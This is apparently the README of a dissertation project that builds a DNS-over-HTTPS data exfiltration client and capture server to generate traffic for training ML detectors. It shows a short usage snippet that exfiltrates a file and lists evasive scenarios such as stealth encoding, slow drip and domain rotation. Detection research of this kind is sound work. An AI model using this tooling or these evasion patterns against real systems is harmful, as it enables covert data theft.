# DoH Exfiltration Research System

A sophisticated DNS-over-HTTPS (DoH) data exfiltration system designed for academic research and security testing. This system demonstrates advanced techniques for data exfiltration via DoH queries and includes comprehensive detection and analysis capabilities.

## 🎓 Academic Context

This system was developed for dissertation research on **DNS-over-HTTPS exfiltration detection using machine learning**. It provides:

- **Realistic exfiltration scenarios** for ML model training
- **Configurable attack patterns** for detection algorithm testing  
- **Performance benchmarks** for detection system evaluation

## 📁 System Components

### Core Modules

- **`client.py`** - Advanced DoH exfiltration client with configurable parameters
- **`server.py`** - Intelligent capture and reconstruction server
- **`config_manager.py`** - Scenario configuration management
- **`test_exfiltration.py`** - Comprehensive testing framework
- **`demo.py`** - Complete research demonstration system

### Key Features

✅ **Multiple encoding methods** (Base64, Hex, Base32, Custom)  
✅ **Timing pattern variations** (Regular, Random, Burst, Stealth)  
✅ **Data compression and encryption**  
✅ **Domain rotation and evasion techniques**  
✅ **Automatic data reconstruction**  
✅ **Comprehensive statistics and analysis**  

## 🚀 Quick Start

### Basic Usage

```python
from client import DoHExfiltrationClient, ExfiltrationConfig, EncodingType
from server import DoHExfiltrationServer

# Create client configuration
config = ExfiltrationConfig(
    chunk_size=30,
    encoding=EncodingType.BASE64,
    compression=True
)

# Initialize client and server
client = DoHExfiltrationClient(config)
server = DoHExfiltrationServer("captured_data")

# Exfiltrate a file
client.exfiltrate_file("secret.txt")
```

### Run Complete Demo

```bash
# Full demonstration with all scenarios
python demo.py

# Quick demo with key scenarios only
python demo.py --quick

# Test specific scenario
python demo.py --scenario advanced_stealth

# List available scenarios
python demo.py --list
```

### Run Test Suite

```bash
# Comprehensive testing framework
python test_exfiltration.py
```

## ⚙️ Configuration Scenarios

The system includes 7 pre-configured research scenarios:

### 🔴 Easily Detectable Scenarios

1. **Classic Base64** - Traditional exfiltration pattern
2. **Burst Attack** - Rapid data extraction in bursts  
3. **Aggressive Extraction** - High-volume, fast exfiltration

### 🟢 Evasive Scenarios

4. **Advanced Stealth** - Custom encoding + encryption + compression
5. **Slow Drip** - Long-term persistent exfiltration
6. **Domain Rotation** - Multiple domains for evasion
7. **Minimal Footprint** - Very small chunks with maximum stealth

## 📊 Research Applications

### ML Model Training

```python
from config_manager import DoHConfigManager

# Load research scenarios
manager = DoHConfigManager()

# Generate training data for detectable patterns
detectable_scenarios = [s for s in manager.list_scenarios() 
                       if manager.get_scenario(s).expected_detection]

# Generate evasive samples for adversarial training
evasive_scenarios = [s for s in manager.list_scenarios() 
                    if not manager.get_scenario(s).expected_detection]
```

### Performance Benchmarking

```python
from test_exfiltration import DoHExfiltrationTester

# Run comprehensive tests
tester = DoHExfiltrationTester()
tester.run_all_tests()

# Analyze detection rates, throughput, reconstruction accuracy
```

## 🔍 Server Analysis Features

### Automatic Pattern Detection

- **Session reconstruction** from fragmented DNS queries
- **Encoding detection** (Base64, Hex, Base32, Custom)
- **Compression detection** and automatic decompression
- **File type identification** from magic bytes

## 🛡️ Detection Integration

### ML Feature Extraction

The system generates traffic patterns compatible with the **CIRA-CIC-DoHBrw-2020 dataset** for ML research:

```python
# Extract statistical features for ML analysis
features = extract_statistical_features_mapped(dns_queries)

# Features include: packet sizes, timing intervals, domain entropy, 
# query patterns, and 28 statistical measures (F1-F28)
```

### Integration with Detection Systems

```python
# Example integration with ML detector
from detector.ml_detect import HTTPSTrafficDetector

detector = HTTPSTrafficDetector()

# Analyze captured DoH traffic
for domain in captured_domains:
    confidence = detector.predict_single_query(domain)
    print(f"Exfiltration confidence: {confidence:.3f}")
```

## 🔧 Technical Architecture

### Server Architecture

```
DoHExfiltrationServer
├── DNS Query Parser
├── Pattern Recognition Engine
├── Session Management
├── Data Reconstruction Pipeline
│   ├── Chunk Reassembly
│   ├── Decoding Engine
│   ├── Decompression
│   └── File Type Detection
```

## ⚠️ Ethical Use Notice

This system is designed for:

✅ **Academic research** and dissertation work  
✅ **Security testing** in controlled environments  
✅ **ML model development** and validation  
✅ **Educational purposes** and security training  

❌ **NOT for malicious use** or unauthorized data exfiltration  
❌ **NOT for production attacks** or illegal activities  

## 🤝 Contributing

For academic collaboration or research contributions:

1. Fork the repository
2. Create research branch (`git checkout -b research/new-technique`)
3. Implement and test changes
4. Document research methodology
5. Submit pull request with academic context

## 📄 License

This research system is provided for academic and educational use. Please cite appropriately in academic publications.

## 🙋 Support

For research questions or collaboration:
- Open an issue for technical problems
- Contact for academic collaboration opportunities  
- Provide feedback on research applications

---

**Research Note**: This system generates realistic DoH exfiltration patterns for security research. All techniques are implemented for defensive research purposes to improve detection capabilities.
